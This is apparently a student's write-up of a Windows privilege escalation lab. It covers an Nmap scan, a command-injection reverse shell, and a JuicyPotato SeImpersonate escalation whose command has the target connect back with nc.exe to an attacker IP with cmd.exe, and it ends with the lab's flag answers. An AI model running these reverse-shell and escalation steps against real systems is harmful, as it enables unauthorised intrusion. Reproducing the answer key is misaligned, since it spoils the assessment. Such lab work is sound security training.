# Skills Assessment 1

uring a penetration test against the INLANEFREIGHT organization, you encounter a non-domain joined Windows server host that suffers from an unpatched command injection vulnerability. After gaining a foothold, you come across credentials that may be useful for lateral movement later in the assessment and uncover another flaw that can be leveraged to escalate privileges on the target host.

For this assessment, assume that your client has a relatively mature patch/vulnerability management program but is understaffed and unaware of many of the best practices around configuration management, which could leave a host open to privilege escalation.

Enumerate the host (starting with an Nmap port scan to identify accessible ports/services), leverage the command injection flaw to gain reverse shell access, escalate privileges to `NT AUTHORITY\SYSTEM` level or similar access, and answer the questions below to complete this portion of the assessment.

## Questions

<details>

<summary>Nmap Enumeration</summary>

```
Starting Nmap 7.94 ( https://nmap.org ) at 2023-07-21 03:20 EDT
Nmap scan report for 10.129.225.46
Host is up (0.19s latency).
Not shown: 998 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE       VERSION
80/tcp   open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: DEV Connection Tester
|_http-server-header: Microsoft-IIS/10.0
3389/tcp open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2023-07-21T07:21:18+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=WINLPE-SKILLS1-SRV
| Not valid before: 2023-07-20T07:18:28
|_Not valid after:  2024-01-19T07:18:28
| rdp-ntlm-info: 
|   Target_Name: WINLPE-SKILLS1-
|   NetBIOS_Domain_Name: WINLPE-SKILLS1-
|   NetBIOS_Computer_Name: WINLPE-SKILLS1-
|   DNS_Domain_Name: WINLPE-SKILLS1-SRV
|   DNS_Computer_Name: WINLPE-SKILLS1-SRV
|   Product_Version: 10.0.14393
|_  System_Time: 2023-07-21T07:21:13+00:00
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

### Command Injection

![](<../../.gitbook/assets/image (126).png>)

```
iis apppool\defaultapppool
```

</details>

<details>

<summary>Foothold (reverse shell) and local enumeration</summary>

### Getting Reverse Shell

I used powershell#3 base64 payload

![](<../../.gitbook/assets/image (124).png>)

```
rlwrap nc -lvnp 7890                          
listening on [any] 7890 ...
connect to [10.10.14.5] from (UNKNOWN) [10.129.225.46] 49670

PS C:\windows\system32\inetsrv> whoami
iis apppool\defaultapppool
PS C:\windows\system32\inetsrv> 
```

### Local Enumeration

```
PS C:\windows\system32\inetsrv> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeAuditPrivilege              Generate security audits                  Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
PS C:\windows\system32\inetsrv> 
```

```
PS C:\windows\system32\inetsrv> wmic qfe
Caption                                     CSName           Description      FixComments  HotFixID   InstallDate  InstalledBy          InstalledOn  Name  ServicePackInEffect  Status  

http://support.microsoft.com/?kbid=3199986  WINLPE-SKILLS1-  Update                        KB3199986               NT AUTHORITY\SYSTEM  11/21/2016                                      
http://support.microsoft.com/?kbid=3200970  WINLPE-SKILLS1-  Security Update               KB3200970               NT AUTHORITY\SYSTEM  11/21/2016                                      

```

```
3199986&3200970
```

</details>

<details>

<summary>Privilege Escalation</summary>

```
PS C:\Users\Public> ./JuicyPotato.exe -l 1337 -c "{5B3E6773-3A99-4A3D-8096-7765DD11785C}" -p c:\windows\system32\cmd.exe -a "/c c:\Users\Public\nc.exe 10.10.14.5 8443 -e cmd.exe" -t *
Testing {5B3E6773-3A99-4A3D-8096-7765DD11785C} 1337
......
[+] authresult 0
{5B3E6773-3A99-4A3D-8096-7765DD11785C};NT AUTHORITY\SYSTEM

[+] CreateProcessWithTokenW OK
PS C:\Users\Public>
```

```
sudo rlwrap nc -lvnp 8443                                                                 
[sudo] password for kali: 
listening on [any] 8443 ...
connect to [10.10.14.5] from (UNKNOWN) [10.129.225.46] 49693
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system
```

</details>

<details>

<summary>Post Exploitation</summary>

```
C:\Users\Administrator>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 7029-F417

 Directory of C:\Users\Administrator

06/04/2021  07:50 PM    <DIR>          .
06/04/2021  07:50 PM    <DIR>          ..
06/04/2021  07:50 PM    <DIR>          .ApacheDirectoryStudio
05/26/2021  06:21 PM    <DIR>          Contacts
08/08/2021  06:54 PM    <DIR>          Desktop
06/07/2021  12:23 PM    <DIR>          Documents
06/07/2021  12:34 PM    <DIR>          Downloads
05/26/2021  06:21 PM    <DIR>          Favorites
05/26/2021  06:21 PM    <DIR>          Links
06/07/2021  12:41 PM    <DIR>          Music
05/26/2021  06:21 PM    <DIR>          Pictures
05/26/2021  06:21 PM    <DIR>          Saved Games
05/26/2021  06:21 PM    <DIR>          Searches
05/26/2021  06:21 PM    <DIR>          Videos
               0 File(s)              0 bytes
              14 Dir(s)  18,932,109,312 bytes free

```

```
C:\Users\Administrator>cd Desktop
cd Desktop

C:\Users\Administrator\Desktop>type flag.txt
type flag.txt
Ev3ry_sysadm1ns_n1ghtMare!
```

![](<../../.gitbook/assets/image (117).png>)

```
C:\>where /R C:\ confidential.txt
where /R C:\ confidential.txt
C:\Documents and Settings\Administrator\Documents\My Music\confidential.txt
C:\Documents and Settings\Administrator\Music\confidential.txt
C:\Documents and Settings\Administrator\My Documents\My Music\confidential.txt
C:\Users\Administrator\Documents\My Music\confidential.txt
C:\Users\Administrator\Music\confidential.txt
C:\Users\Administrator\My Documents\My Music\confidential.txt

C:\>type C:\Users\Administrator\Music\confidential.txt
type C:\Users\Administrator\Music\confidential.txt
5e5a7dafa79d923de3340e146318c31a

```

</details>

Which two KBs are installed on the target system? (Answer format: 3210000&3210060)

* ```
  3199986&3200970
  ```

Find the password for the ldapadmin account somewhere on the system.

\-

Escalate privileges and submit the contents of the flag.txt file on the Administrator Desktop.

* ```
  Ev3ry_sysadm1ns_n1ghtMare!
  ```

After escalating privileges, locate a file named confidential.txt. Submit the contents of this file.

* ```
  5e5a7dafa79d923de3340e146318c31a
  ```
